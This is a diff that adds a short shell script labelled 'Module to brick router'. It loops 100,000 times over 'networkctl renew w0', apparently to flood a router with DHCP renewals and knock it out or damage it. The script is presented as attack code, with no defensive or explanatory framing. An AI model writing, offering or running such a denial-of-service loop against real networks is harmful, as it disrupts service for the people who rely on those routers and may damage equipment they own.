@@ -1,0 +1,8 @@
+#!/bin/sh
+
+#Module to brick router
+
+for i in {1..100000}
+do
+    networkctl renew w0 #Network Interface Card
+done
